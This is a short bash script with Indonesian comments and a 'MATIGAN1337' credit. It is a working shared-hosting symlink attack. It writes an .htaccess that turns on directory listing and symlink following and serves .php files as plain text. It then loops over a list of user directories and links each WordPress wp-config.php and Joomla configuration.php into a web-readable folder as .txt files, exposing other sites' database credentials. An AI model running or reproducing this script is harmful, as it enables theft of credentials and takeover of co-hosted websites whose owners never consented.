#!/bin/bash
echo "CREATE BY MATIGAN1337"
echo "-----------------------"

# Membuat folder baru untuk menyimpan tautan simbolik
output_folder="symlink_output"
mkdir -p "$output_folder"

# Mendefinisikan isi dari file .htaccess
htaccess_content="Options Indexes FollowSymLinks\nDirectoryIndex tiganku.htm\nAddType text/plain .php\nAddHandler text/plain .php\nSatisfy Any"

# Menyimpan isi .htaccess ke dalam folder utama
echo -e "$htaccess_content" > "$output_folder/.htaccess"
echo ".htaccess file created."

# Loop melalui setiap direktori pengguna yang telah ditentukan sebelumnya
while IFS= read -r directory; do
  config_path_wp="$directory/wp-config.php"
  config_path_joomla="$directory/configuration.php"
  
  # Mengecek apakah file wp-config.php ada
  if [ -f "$config_path_wp" ]; then
    # Membuat tautan simbolik untuk file wp-config.php ke folder utama dengan nama [directory]-WP-config.txt
    ln -s "$config_path_wp" "$output_folder/${directory//\//-}-WP-config.txt"
    echo "WordPress Config for directory $directory: linked to $output_folder/${directory//\//-}-WP-config.txt"
  fi

  # Mengecek apakah file configuration.php ada
  if [ -f "$config_path_joomla" ]; then
    # Membuat tautan simbolik untuk file configuration.php ke folder utama dengan nama [directory]-JOOMLA-config.txt
    ln -s "$config_path_joomla" "$output_folder/${directory//\//-}-JOOMLA-config.txt"
    echo "Joomla Config for directory $directory: linked to $output_folder/${directory//\//-}-JOOMLA-config.txt"
  fi
done < "list_file.txt"

echo "Script telah selesai. Tautan simbolik disimpan dalam folder $output_folder"
